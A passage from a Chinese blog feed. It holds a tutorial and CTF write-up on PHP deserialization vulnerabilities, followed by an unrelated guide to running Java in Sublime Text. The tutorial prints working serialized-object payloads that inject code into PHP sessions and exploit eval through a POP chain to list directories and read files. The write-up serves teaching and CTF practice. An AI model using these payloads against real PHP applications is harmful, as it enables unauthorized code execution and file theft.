class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">string</span>(5) "<span class="selector-tag">i</span><span class="selector-pseudo">:34</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(13) "<span class="selector-tag">s</span><span class="selector-pseudo">:6</span><span class="selector-pseudo">:"uusama"</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(4) "<span class="selector-tag">b</span><span class="selector-pseudo">:1</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(2) "<span class="selector-tag">N</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(30) "<span class="selector-tag">a</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"a"</span>;<span class="attribute">i</span>:<span class="number">1</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"b"</span>;<span class="attribute">i</span>:<span class="number">2</span>;&#125;"</span><br><span class="line"><span class="selector-tag">string</span>(52) "<span class="selector-tag">O</span><span class="selector-pseudo">:2</span><span class="selector-pseudo">:"CC"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"data"</span>;<span class="attribute">s</span>:<span class="number">2</span>:<span class="string">"uu"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">" CC pass"</span>;<span class="attribute">b</span>:<span class="number">1</span>;&#125;"</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-php对象常见的魔术函数"><a href="#2-php对象常见的魔术函数" class="headerlink" title="2.php对象常见的魔术函数"></a>2.php对象常见的魔术函数</h3><ul><li><p>__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。</p></li><li><p>__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。</p></li><li><p>__toString：当对象被当做一个字符串使用时调用。</p></li><li><p>__sleep:序列化对象之前就调用此方法(其返回需要一个数组)</p></li><li><p>__wakeup:反序列化恢复对象之前调用该方法</p></li><li><p>__call:当调用对象中不存在的方法会自动调用该方法。</p></li><li><p>__get:在调用私有属性的时候会自动执行</p></li></ul><p>Example:<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/2-1-1.jpg"></p><h3 id="3-php-session序列化和反序列化相关知识"><a href="#3-php-session序列化和反序列化相关知识" class="headerlink" title="3.php_session序列化和反序列化相关知识"></a>3.php_session序列化和反序列化相关知识</h3><h5 id="3-1-php-session处理器"><a href="#3-1-php-session处理器" class="headerlink" title="3.1 php_session处理器"></a>3.1 php_session处理器</h5><ul><li><p>PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p><table><thead><tr><th>处理器</th><th align="center">对应的存储格式</th></tr></thead><tbody><tr><td>php</td><td align="center">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_binary</td><td align="center">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_serialize(php&gt;=5.5.4)</td><td align="center">经过 serialize() 函数反序列处理的数组</td></tr></tbody></table></li><li><p>设置方式：</p><ul><li>在php_ini中session.serialize_handler(PHP_INI_ALL) 设置</li><li>也可以在代码中设置：<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></li></ul></li><li><p>Example:</p><ul><li><p><code>&lt;?phpini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();$ _SESSION[&#39;a&#39;] = $_GET[&#39;a&#39;]; var_dump($_SESSION);?&gt;</code></p></li><li><p>当传入<code>?a=O:4:&quot;pass&quot;:0:{}</code>时：</p><ul><li><p>php处理器存储的为：<code>a|s:15:&quot;O:4:&quot;pass&quot;:0:{}&quot;;</code></p></li><li><p>php_serialize处理器存储的为：<code>a:1:{s:1:&quot;a&quot;;s:15:&quot;O:4:&quot;pass&quot;:0:{}&quot;;}</code></p></li><li><p>php_binary处理器存储的为：<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/3-1-1.png"></p><ul><li>注：SOH符号为start of heading 的缩写，它表示标题的开始</li></ul></li></ul></li></ul></li></ul><h5 id="3-2-php-ini中与php-session相关的配置知识"><a href="#3-2-php-ini中与php-session相关的配置知识" class="headerlink" title="3.2 php_ini中与php_session相关的配置知识"></a>3.2 php_ini中与php_session相关的配置知识</h5><ul><li><code>session.save_path = &quot;&quot;</code> 设置session的存储路径</li><li><code>session.auto_start = boolen</code> 指定会话模块是否在请求开始时启动一个会话，默认0(不启动)</li><li><code>session.serialize_handler = string</code> 指定序列化、反序列化处理器</li></ul><h5 id="3-3-熟悉phpinfo中相关配置"><a href="#3-3-熟悉phpinfo中相关配置" class="headerlink" title="3.3 熟悉phpinfo中相关配置"></a>3.3 熟悉phpinfo中相关配置</h5><ul><li>尤其是关于session，可以通过phpinfo查看相关配置<br><img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/3-3-1.png"></li></ul><h3 id="4-常见的漏洞"><a href="#4-常见的漏洞" class="headerlink" title="4.常见的漏洞"></a>4.常见的漏洞</h3><h4 id="4-1-将传来的序列化unserilize，造成魔幻函数执行"><a href="#4-1-将传来的序列化unserilize，造成魔幻函数执行" class="headerlink" title="4.1 将传来的序列化unserilize，造成魔幻函数执行"></a>4.1 将传来的序列化unserilize，造成魔幻函数执行</h4><h5 id="4-1-1-Demo1"><a href="#4-1-1-Demo1" class="headerlink" title="4.1.1 Demo1"></a>4.1.1 Demo1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; <span class="comment">//flag.php    </span></span><br><span class="line"><span class="keyword">public</span> $file;    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;        </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;            </span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);          </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;        </span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);        </span><br><span class="line">&#125;    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$password = unserialize($_GET[<span class="string">'password'</span>]);  </span><br><span class="line"><span class="keyword">echo</span> $password;   </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>分析代码可知关键点在于<code>file_get_contents</code>，再由下面的代码可以大概有个思路：当对象被当作字符串使用时会调用__ tostring()魔术函数，所以如果当我们直接给password传入一个构造好的序列化对象，那么在echo这个password变量的时候，就相当于直接输出这个对象，也就会直接调用__tostring魔术函数。</li><li>构造payload：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; <span class="comment">//flag.php    </span></span><br><span class="line"><span class="keyword">public</span> $file;    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;        </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;            </span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);          </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;        </span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);        </span><br><span class="line">&#125;    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Flag();</span><br><span class="line">$obj-&gt;file = <span class="string">"Flag.php"</span>; </span><br><span class="line"><span class="keyword">echo</span> serialize($obj); </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li>生成结果：<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></li><li>最后传入结果，读出flag.php<br><img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-1-1.png"></li></ul><h5 id="4-1-2-Demo2"><a href="#4-1-2-Demo2" class="headerlink" title="4.1.2 Demo2"></a>4.1.2 Demo2</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;   <span class="comment">//flag.php    </span></span><br><span class="line"><span class="keyword">public</span> $file;    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; </span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);        </span><br><span class="line">&#125;    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">'password'</span>]); </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>分析代码可知都第一个例子一样，因为有<code>file_get_contents()</code>,所以要想办法触发这个条件，而<code>__wakeup()</code>这个魔术函数是反序列化恢复对象之前会被调用到。所以可以使用与第一个例子相同的构造方法得到payload。最后传入：<code>?password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>即可得到flag.php中的文件。</li><li>同样的例子还可以利用其他的例如<code>__construct</code>、<code>__destruct</code>等都可以实现。</li><li>总结：<ol><li>有可控的数据被反序列化</li><li>有魔术函数中敏感代码被执行</li></ol></li></ul><h4 id="4-2-php-session处理器设置不当的漏洞。"><a href="#4-2-php-session处理器设置不当的漏洞。" class="headerlink" title="4.2 php session处理器设置不当的漏洞。"></a>4.2 php session处理器设置不当的漏洞。</h4><ul><li><p>此处使用经典CTF题目作为例子，题目地址：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">PHPINFO</a></p></li><li><p>题目源码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//A webshell is wait for you</span></span></span><br><span class="line"><span class="php">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $mdzz;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span></span><br><span class="line"><span class="php">    &#125;    </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $m = <span class="keyword">new</span> OowoO();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;    </span></span><br><span class="line"><span class="php">highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>解题思路：</p><ol><li><p>通过观察代码可知当存在phpinfo变量时，会创建对象，由于存在<code>__construct()</code>函数，在创建时会将<code>phpinfo();</code>赋值给<code>mdzz</code>。在对象被销毁时，因为有<code>__destruct()</code>函数，所以会执行<code>phpinfo()</code>函数。</p></li><li><p>通过观察<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-0_1.png"><br>可知，全局使用的时php_serialize处理器进行序列化，而这个页面则是使用php处理器来进行解析</p></li><li><p>由上面所讲的两种处理器的存储格式可知，如果在php_serialize处理器下存储数据时，加上了“|”，那么当把这个数据再给php处理器解释的时候，“|”前的数据就会被当作<code>$_SESSION</code>数组的键来解释</p><ul><li><p>当处理器为php_serialize时：OowoO类所创建对象的序列化存储为<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-0_2.png"></p></li><li><p>当处理器为php时：OowoO类所创建对象的序列化存储为<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-0_3.png"></p></li><li><p>所以当我在用php_serialize处理器存储的字符可以引入 “|” , 再用php格式取出$_SESSION的值时 “|”会被当成键值对的分隔符。</p></li><li><p>例：<br><img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-1_1.png"><br>此时结果为：<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-1_2.png"><br>对应的存储文件内容为：<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-1_3.png"><br>而当把代码改为：</p><p>  <img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-2_1.png"></p><p>  变换处理器后，在SESSION存储文件没有改变的情况下，php处理器就会将之前的文件内容解释为：<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-2_2.png"></p></li><li><p>由此可以看到：<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-3.png"></p></li></ul></li></ol></li></ul><ol start="4"><li><p>所以，我们利用这个特性事先准备一个payload进行攻击。那么这个时候我们所面临的问题就是如何将payload写入session来让这个脚本进行解释。这个地方我们需要利用php的一个bug：<a href="https://bugs.php.net/bug.php?id=71101" target="_blank" rel="noopener">PHP Session Data Injection Vulnerability</a></p><ul><li>原文大概意思为当启用<code>session.upload_progress.enabled</code>时（从5.4系列开始在php.ini中默认启用），上传一个字段的属性名与<code>session.upload_progress.name</code>的值相同，即可将payload写入session</li><li><code>session.upload_progress.name</code>可在phpinfo中看到<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-4.png"></li></ul></li><li><ul><li><p>当明白上述Bug后，写一个脚本：<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-5.png"><br>然后开始构建payload，通过phpinfo查看禁用函数：<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-6.png"></p></li><li><p>发现只能用<code>var_dump</code>、<code>scandir</code>和<code>file_get_contents</code>来尝试构建payload读取flag：<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-7.png"></p></li><li><p>构造好的payload：<code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:24:&quot;var_dump(scandir(&#39;反序列化漏洞/&#39;));&quot;;}</code></p><p>  然后对其进行加工：<br><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:24:\&quot;var_dump(scandir(&#39;反序列化漏洞/&#39;));\&quot;;}</code></p><p>  加工后，”|”前面的数据就会变成键，而后面的我们构造的就会变成值来执行。</p></li></ul></li><li><p>构建好后，先在自己构建的网页上随便传一个文件，并抓包，抓到包后，将文件名改为上面修改好后payload：<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-8.png"></p><ul><li>然后这个地方可以可以使用一个payload：<code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}</code></li><li>也可以使用我参考的资料（sijidou大佬）中的一个方法：通过查看phpinfo中的session的存放位置：<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-9.png">)，然后推测大概是装了xampp这个集成环境，从而得到web页面存放环境，构建payload：<code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:40:\&quot;var_dump(scandir(&#39;/opt/lampp/htdocs/&#39;));\&quot;;}</code><img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-10.png"></li><li>得到flag文件的绝对路径后，直接构造payload：<code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:89:\&quot;var_dump(file_get_contents(&#39;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&#39;));\&quot;;}</code><img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-11.png">成功得到flag</li><li>要复现题目时，注意<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/4-2-12.png">如果为On，就不能将上传的内容保存到session中。</li></ul></li><li><ul><li>一开始做这个没想明白一个问题：为什么传入的数据会被执行，再进行数据传输的时候，传入的值应该是被保存到了SESSION的储存文件中，但是却直接执行了，并返回了结果。</li><li>后面查看了php中文文档，找到原因</li><li>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数，而read 回调函数必须返回将会话数据编码（序列化）后的字符串。PHP 会自动反序列化返回的字符串并填充 $_SESSION 超级全局变量。因为把传入的值直接自动反序列化了，所以说是会直接执行。</li></ul></li></ol><h3 id="5-构造注入链：pop"><a href="#5-构造注入链：pop" class="headerlink" title="5.构造注入链：pop"></a>5.构造注入链：pop</h3><h4 id="5-1-POP链原理："><a href="#5-1-POP链原理：" class="headerlink" title="5.1.POP链原理："></a>5.1.POP链原理：</h4><ul><li>面向属性编程（Property-Oriented Programing）</li><li>在反序列化漏洞的利用中，最理想的情况就是能利用的点在那几个魔术函数中，但是如果魔术函数中没用可以利用的方法，比如上面例子中的eval()函数并不在__destruct()函数中，而在一个普通的方法中，那就没办法直接使用了。</li><li>所以这个时候我们就需要构造一个链，使得我们可以链接到我们需要的eval()函数。</li></ul><h5 id="5-1-1-Demo3"><a href="#5-1-1-Demo3" class="headerlink" title="5.1.1.Demo3"></a>5.1.1.Demo3</h5><p><img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/5-1-1.png"></p><ul><li><p>分析代码可知我们需要的函数在eval类中，而在代码中，调用并执行的的方法在lemon类中。所以我们需要传入一个构造好的序列化数据，使得lemon可以调用evil。</p></li><li><p>构造代码：</p><p>  <img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/5-1-2.png"></p><p>  得到poc：<code>O%3A5%3A%22lemon%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</code><br>传入后代码执行：<img src="/img/loading.gif" alt="Alt" class="lazyload" data-src="/images/5-1-3.png"></p></li></ul><h4 id="5-2-复杂POP链构造与phar反序列化后续跟进"><a href="#5-2-复杂POP链构造与phar反序列化后续跟进" class="headerlink" title="5.2.复杂POP链构造与phar反序列化后续跟进"></a>5.2.复杂POP链构造与phar反序列化后续跟进</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PHP反序列化漏洞&quot;&gt;&lt;a href=&quot;#PHP反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化漏洞&quot;&gt;&lt;/a&gt;PHP反序列化漏洞&lt;/h2&gt;&lt;h3 id=&quot;1-序列化与反序列化&quot;&gt;&lt;a href=&quot;#1-序列化与反序列化&quot; cla
      
    
    </summary>
    
    
      <category term="漏洞总结" scheme="www.jarvis-cy.com/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="PHP" scheme="www.jarvis-cy.com/tags/PHP/"/>
    
      <category term="反序列化" scheme="www.jarvis-cy.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>使用Sublime编写并运行Java的各种问题</title>
    <link href="www.jarvis-cy.com/2020/02/13/%E4%BD%BF%E7%94%A8Sublime%E7%BC%96%E5%86%99%E5%B9%B6%E8%BF%90%E8%A1%8CJava%E7%9A%84%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98/"/>
    <id>www.jarvis-cy.com/2020/02/13/%E4%BD%BF%E7%94%A8Sublime%E7%BC%96%E5%86%99%E5%B9%B6%E8%BF%90%E8%A1%8CJava%E7%9A%84%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98/</id>
    <published>2020-02-13T07:45:30.000Z</published>
    <updated>2020-03-26T08:23:56.066Z</updated>
    
    <content type="html"><![CDATA[<p>假期因为疫情出不去，于是在家重新学习Java，实在不想使用Eclipse（太笨重），于是学习了一下使用Sublime编译运行Java，在网上看了几篇教程，做个总结记录一下。</p><h2 id="1-安装好JDK并配置好环境变量"><a href="#1-安装好JDK并配置好环境变量" class="headerlink" title="1.安装好JDK并配置好环境变量"></a>1.安装好JDK并配置好环境变量</h2><ul><li>直接百度<a href="https://jingyan.baidu.com/article/fd8044fa2c22f15031137a2a.html" target="_blank" rel="noopener">Java环境变量配置</a></li></ul><h2 id="2-安装Sublime-Text3"><a href="#2-安装Sublime-Text3" class="headerlink" title="2.安装Sublime Text3"></a>2.安装Sublime Text3</h2><ul><li>直接安装<a href="http://sublimetextcn.com/" target="_blank" rel="noopener">下载地址</a></li></ul><h2 id="3-配置相关文件"><a href="#3-配置相关文件" class="headerlink" title="3.配置相关文件"></a>3.配置相关文件</h2><ul><li><code>..\Sublime Text3\Packages</code><img src="/img/loading.gif" alt="Text" class="lazyload" data-src="/images/SJ01.png"></li><li>使用压缩软件打开红框中的文件（强烈推荐7z，真的超好用）<br><img src="/img/loading.gif" alt="Text" class="lazyload" data-src="/images/SJ02.png"></li><li>将红框中的文件拖出来，然后直接在压缩包中删除掉源文件（防止修改好放回来时没有成功覆盖）</li><li>打开该文件（直接用sublime打开就好），并将其中内容修改成下图<br><img src="/img/loading.gif" alt="Text" class="lazyload" data-src="/images/SJ03.png"></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"shell_cmd"</span>: <span class="string">"runJava.bat \"$file\""</span>,</span><br><span class="line"><span class="attr">"file_regex"</span>: <span class="string">"^(...*?):([0-9]*):?([0-9]*)"</span>,</span><br><span class="line"><span class="attr">"selector"</span>: <span class="string">"source.java"</span>,</span><br><span class="line">    <span class="attr">"encoding"</span>: <span class="string">"cp936"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  保存好后，将该文件再拖回刚才的压缩包中。</p><ul><li>现在打开JDK安装目录，进入到%JAVA_HOME%中（安装JDK时应该配置过），在该目录下创建上图第一个红框所写的文件（名称随意，但要一致），内容为下图<br><img src="/img/loading.gif" alt="runJava.bat" class="lazyload" data-src="/images/SJ04.png"><br>一定要加上红框中的<code>utf-8</code>,不然对中文的输出可能会出问题</li></ul><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@echo <span class="literal">off</span></span><br><span class="line">cd %~dp1</span><br><span class="line">echo Compiling %~nx1......</span><br><span class="line"><span class="keyword">if</span> exist %~n1<span class="class">.<span class="keyword">class</span> (</span></span><br><span class="line"> del %~n1<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">)</span><br><span class="line">javac -encoding utf<span class="number">-8</span> %~nx1</span><br><span class="line"><span class="keyword">if</span> exist %~n1<span class="class">.<span class="keyword">class</span> (</span></span><br><span class="line"> echo ------Output------</span><br><span class="line"> java %~n1</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="4-运行测试"><a href="#4-运行测试" class="headerlink" title="4.运行测试"></a>4.运行测试</h2><ul><li>保存好后测试运行，我的快捷键是Ctrl + b，运行效果如下：<br><img src="/img/loading.gif" alt="Text" class="lazyload" data-src="/images/SJ05.png"><br><img src="/img/loading.gif" alt="Text" class="lazyload" data-src="/images/SJ06.png"><br><img src="/img/loading.gif" alt="Text" class="lazyload" data-src="/images/SJ07.png"><h2 id="5-配置Sublime自动补全getter、setter"><a href="#5-配置Sublime自动补全getter、setter" class="headerlink" title="5. 配置Sublime自动补全getter、setter"></a>5. 配置Sublime自动补全getter、setter</h2></li><li>打开sublime，点击工具，找到新代码段，点击后会打开一个文件<br><img src="/img/loading.gif" alt="Text" class="lazyload" data-src="/images/SJ08.png"><br>修改文件中的内容，将内容修改为</li></ul><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">snippet</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="xml"><span class="tag">&lt;<span class="name">content</span>&gt;</span>&lt;![CDATA[</span></span><br><span class="line"><span class="xml">/**</span></span><br><span class="line"><span class="xml"> * Getter for $</span><span class="xquery">&#123;<span class="number">1</span>:<span class="variable">$SELECTION</span>&#125;</span></span><br><span class="line"><span class="xml"> * @return</span></span><br><span class="line"><span class="xml"> */</span></span><br><span class="line"><span class="xml">public function get$</span><span class="xquery">&#123;<span class="number">2</span>:property&#125;</span><span class="xml">()</span></span><br><span class="line"><span class="xquery">&#123;</span></span><br><span class="line"><span class="xquery">    <span class="keyword">return</span> \<span class="variable">$this-</span>&gt;<span class="variable">$1</span>;</span></span><br><span class="line"><span class="xquery">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">/**</span></span><br><span class="line"><span class="xml"> * Setter for $1</span></span><br><span class="line"><span class="xml"> * @param $1 value to set</span></span><br><span class="line"><span class="xml"> * @return self</span></span><br><span class="line"><span class="xml"> */</span></span><br><span class="line"><span class="xml">public function set$</span><span class="xquery">&#123;<span class="number">2</span>:property&#125;</span><span class="xml">(\$$1)</span></span><br><span class="line"><span class="xquery">&#123;</span></span><br><span class="line"><span class="xquery">    \<span class="variable">$this-</span>&gt;<span class="variable">$1</span> = \$$&#123;<span class="number">1</span>/<span class="number">_</span>(w)/U<span class="variable">$1</span>/g<span class="variable">$1</span>&#125;</span><span class="xml">;</span></span><br><span class="line"><span class="xml">    return \$this;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">]]&gt;<span class="tag">&lt;/<span class="name">content</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- Optional: Set a tabTrigger to define how to trigger the snippet --&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="xml"><span class="tag">&lt;<span class="name">tabTrigger</span>&gt;</span>getset<span class="tag">&lt;/<span class="name">tabTrigger</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- Optional: Set a scope to limit where the snippet will trigger --&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="xml"><span class="tag">&lt;<span 